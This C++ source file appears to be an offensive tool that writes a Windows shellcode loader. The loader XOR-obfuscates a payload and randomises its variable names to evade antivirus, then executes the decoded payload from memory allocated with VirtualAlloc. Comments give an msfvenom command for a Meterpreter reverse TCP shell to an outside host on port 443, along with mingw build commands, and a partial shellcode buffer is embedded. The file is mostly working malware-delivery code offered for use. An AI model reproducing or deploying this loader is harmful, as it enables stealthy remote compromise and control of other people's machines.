#include "iostream"
#include <fstream>
#include <string>
#include <time.h>
#include <stdlib.h>

using namespace std;

string randString(int size) {
    string a;
    for (int i = 0; i < size; i++) {
        int asc_value = rand() % 122 + 65;
        if ((asc_value <= 90 && asc_value >= 65) || (asc_value >= 97 && asc_value <= 122))
            a += (char) asc_value;
        else
            i--;

    }

    return a;
}

void creator(string fName, string aName, unsigned char *shelly, int s_c, string key, string kName) {
    ofstream cout("flip-obfuscated.cpp");

    unsigned char encodedShelly[s_c];
    cout << "#include <windows.h>" << endl;
    cout << "#include <string>" << endl;
    cout << "using namespace std;" << endl;

    for (int i = 0; i < 10; i++)
        cout << endl;
    cout << "int main(int argc, char **argv){" << endl << endl;
    cout << "if (strstr(argv[0], \"a.exe\") == NULL) { return 1; }" << endl << endl;
    cout << "string " << kName << "=" << "\"" << key << "\"" << ";" << endl << endl;
    cout << "char " << aName << "[]" << " = " << "\"";

    int j = 0;
    for (int i = 0; i < s_c; i++) {
        if (j >= key.size() - 1)
            j = 0;

        encodedShelly[i] = shelly[i] ^ key[j];

        j++;
    }

    for (int i = 0; i < s_c; i++) {
        cout << "\\x" << hex << (int) encodedShelly[i];
    }

    cout << "\";";

    cout << endl << endl << endl;
    cout << "int j = 0;" << endl;
    cout << "for(int i=0; i < sizeof " << aName << "; i++){" << endl;
    cout << "if(j == " << kName << ".size()" << " -1) j=0;" << endl;
    cout << aName << "[" << "i" << "]" << " = " << aName << "[" << "i" << "]" << "^" << kName << "[j]" << ";" << endl;
    cout << "j++;";
    cout << "}";
    cout << endl << endl;
    cout << "void *" << fName << " = VirtualAlloc(0, " << "sizeof " << aName << ", MEM_COMMIT, PAGE_EXECUTE_READWRITE);"
         << endl;
    cout << "memcpy(" << fName << ", " << aName << ", sizeof " << aName << ");" << endl;

    cout << "((void(*)())" << fName << ")()" << ";" << endl;
    cout << "}";

}


int main() {
    //::ShowWindow(::GetConsoleWindow(), SW_HIDE);
    unsigned seed = time(0);
    srand(seed);

    int funcNameSize = rand() % 15 + 5;
    string funcName = randString(funcNameSize);

    int arrNameSize = rand() % 13 + 7;
    string arrName = randString(arrNameSize);

    int keyNameSize = rand() % 19 + 7;
    string keyName = randString(keyNameSize);

    int ptrNameSize = rand() % 25 + 5;
    string ptrName = randString(ptrNameSize);

    cout << "Encoding Key= ";
    string encodeKey;
    cin >> encodeKey;

//Replace here with ur shellcode
// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.118 LPORT=443 EXITFUNC=thread -f c
// 32 bits:
// i686-w64-mingw32-g++ flip-obfuscated.cpp -o a.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
// 64 bits
// x86_64-w64-mingw32-g++ flip-obfuscated.cpp -o a.exe -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
    unsigned char buf[] =
            "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52"
            "..."
            "\xd5";

    creator(funcName, arrName, buf, sizeof buf, encodeKey, keyName);
}
